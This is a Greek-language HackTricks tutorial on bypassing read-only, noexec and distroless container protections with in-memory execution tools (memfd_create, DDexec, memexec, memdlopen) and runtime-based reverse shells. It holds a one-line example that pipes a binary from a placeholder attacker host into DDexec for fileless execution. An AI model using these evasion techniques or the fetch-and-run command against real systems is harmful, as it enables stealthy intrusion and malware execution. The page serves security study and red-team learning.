# Παράκαμψη προστασιών FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Βίντεο

Στα παρακάτω βίντεο παρουσιάζονται αναλυτικότερα οι τεχνικές που αναφέρονται σε αυτή τη σελίδα:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Σενάριο read-only / no-exec

Σε ένα container, μπορείτε να κάνετε mount το root filesystem ως read-only ορίζοντας **`readOnlyRootFilesystem: true`** στο security context.<sup>[[3]](#references)</sup> Για παράδειγμα:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ένα read-only root δεν κάνει read-only τα volumes που έχουν γίνει mount ξεχωριστά. Το Docker αντιμετωπίζει το **`/dev/shm`** ως IPC mount, ενώ επιλογές tmpfs όπως οι `rw` και `noexec` είναι επιλογές ρύθμισης κατά το runtime· ελέγξτε τις επιλογές mount του container-στόχου πριν βασιστείτε σε οποιαδήποτε από τις δύο συμπεριφορές.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Από την οπτική ενός red-team, αυτός ο συνδυασμός μπορεί να δυσκολέψει τη λήψη και εκτέλεση binaries που δεν είναι ήδη διαθέσιμα (για παράδειγμα, backdoors ή εργαλεία enumeration).<sup>[[4]](#references)[[5]](#references)</sup>

## Ευκολότερη παράκαμψη: Scripts

Ένα `noexec` mount αποκλείει την άμεση εκτέλεση binaries από αυτό το mount, όμως ένας interpreter μπορεί να διαβάσει και να ερμηνεύσει ένα script. Επομένως, αν υπάρχει `sh` ή `python`, μπορείτε να εκτελέσετε ένα shell ή Python script μέσω αυτού του interpreter.<sup>[[5]](#references)</sup>

Αυτό δεν βοηθά όταν το απαιτούμενο εργαλείο είναι το ίδιο binary.<sup>[[5]](#references)</sup>

## Παρακάμψεις μέσω μνήμης

Όταν η άμεση εκτέλεση από ένα mounted path αποκλείεται, μία επιλογή είναι να φορτώσετε το ELF στη μνήμη και να το εκτελέσετε μέσω μιας in-memory διαδρομής. Αυτό παρακάμπτει τον έλεγχο `noexec` σε εκείνο το mount, αλλά δεν καταργεί άλλους ελέγχους του kernel, δικαιωμάτων ή policy.<sup>[[5]](#references)[[6]](#references)</sup>

### Παράκαμψη FD + exec syscall

Αν ένα scripting runtime μπορεί να έχει πρόσβαση στο σχετικό Linux interface, μπορεί να δημιουργήσει ένα ανώνυμο file descriptor με υποστήριξη RAM, χρησιμοποιώντας το **`memfd_create(2)`**, να γράψει σε αυτό τα bytes του ELF και να χρησιμοποιήσει ένα fd-backed μονοπάτι εκτέλεσης. Το project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) δημιουργεί συμπιεσμένο και κωδικοποιημένο σε base64 κώδικα Python, Perl ή Ruby για αυτό το workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Το project τεκμηριώνει επί του παρόντος targets για Python, Perl και Ruby· τα PHP ή Node χρειάζονται διαφορετική runtime-specific τεχνική ή extension, επομένως η απουσία αυτού του generator για μια γλώσσα δεν σημαίνει ότι η εκτέλεση στη μνήμη είναι αδύνατη.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Ένα κανονικό executable που γράφεται στο **`/dev/shm`** εξακολουθεί να υπόκειται στη ρύθμιση **`noexec`** αυτού του mount· το απλό άνοιγμά του μέσω ενός ordinary file descriptor δεν αλλάζει την policy του mount.<sup>[[5]](#references)</sup>
>
> Η ακριβής μέθοδος εκτέλεσης στη μνήμη εξαρτάται επίσης από το runtime, την αρχιτεκτονική, τον kernel και τα διαθέσιμα δικαιώματα.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

Το [**DDexec / EverythingExec**](https://github.com/arget13/DDexec) γράφει έναν stager και loader στη running shell process μέσω του **`/proc/self/mem`** και στη συνέχεια μεταφέρει τον έλεγχο σε αυτόν τον κώδικα.<sup>[[8]](#references)</sup>

Αυτό επιτρέπει στη process να φορτώσει ένα παρεχόμενο binary χωρίς να το τοποθετήσει πρώτα σε executable filesystem.<sup>[[8]](#references)</sup>

> [!TIP]
> Το **DDexec / EverythingExec** μπορεί να φορτώσει και να **εκτελέσει** shellcode ή ένα binary από τη **μνήμη**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, ελέγξτε το Github ή:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

Το [**Memexec**](https://github.com/arget13/memexec) είναι μια daemonized υλοποίηση του DDexec. Ο daemon του ακούει για αιτήματα που περιέχουν arguments και raw program bytes, κάνει fork ένα child για να φορτώσει και να εκτελέσει κάθε πρόγραμμα και διατηρεί τον parent ως server.<sup>[[9]](#references)</sup>

Το repository περιλαμβάνει ένα παράδειγμα χρήσης του **memexec για την εκτέλεση binaries από ένα PHP reverse shell** στο [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Με παρόμοιο σκοπό με το DDexec, το [**memdlopen**](https://github.com/arget13/memdlopen) είναι μια fileless υλοποίηση του `dlopen()` για shared object ή πρόγραμμα. Το README του τεκμηριώνει επί του παρόντος υποστήριξη ARM64, επομένως ελέγξτε την αρχιτεκτονική του target πριν το χρησιμοποιήσετε.<sup>[[10]](#references)</sup>

## Distroless Bypass

Για μια ειδική εξήγηση σχετικά με το **τι είναι στην πραγματικότητα το distroless**, πότε βοηθά, πότε δεν βοηθά και πώς αλλάζει το post-exploitation tradecraft σε containers, ελέγξτε:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Τι είναι το distroless

Τα distroless images περιέχουν μόνο την εφαρμογή και τα runtime dependencies της· τα official images παραλείπουν package managers, shells και άλλα προγράμματα που αναμένονται σε μια τυπική Linux distribution.<sup>[[11]](#references)</sup>

Η διατήρηση του runtime image μόνο με αυτά τα dependencies μειώνει το λογισμικό που υπάρχει στο production, καθώς και την ποσότητα που πρέπει να γίνεται scan και tracking.<sup>[[11]](#references)</sup>

### Reverse Shell

Σε ένα distroless container ενδέχεται να **μη βρείτε `sh` ή `bash`** για ένα κανονικό shell, ούτε συνηθισμένα utilities όπως `ls`, `whoami` ή `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Επομένως, ένα συνηθισμένο shell-based reverse shell ή utility-based enumeration ενδέχεται να μη λειτουργήσει.<sup>[[11]](#references)</sup>

Αν η compromised εφαρμογή περιλαμβάνει language runtime (για παράδειγμα, Python για μια Flask εφαρμογή ή Node.js για μια Node εφαρμογή), ένα RCE ενδέχεται και πάλι να μπορεί να χρησιμοποιήσει αυτό το runtime για command channel και system inspection μέσω των APIs του.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Χρησιμοποιήστε τη διαθέσιμη scripting language για να **κάνετε enumerate στο σύστημα** μέσω των δυνατοτήτων της γλώσσας.<sup>[[12]](#references)</sup>

Αν δεν υπάρχουν **read-only/no-exec** protections, ένα command channel ενδέχεται να μπορεί να γράψει binaries σε writable, executable mount και να τα εκτελέσει· επαληθεύστε πρώτα τα mount options και τα permissions.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Όταν υπάρχουν αυτές οι protections, χρησιμοποιήστε τις **memory-execution techniques παραπάνω**, όπου το runtime, ο kernel και τα permissions το επιτρέπουν.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Μπορείτε να βρείτε **παραδείγματα** εκμετάλλευσης RCE vulnerabilities για την απόκτηση scripting-language **reverse shells** και την εκτέλεση binaries από τη memory στο [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Εξερεύνηση του Linux Memory Manipulation για Stealth και Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Διαμόρφωση Security Context για Pod ή Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
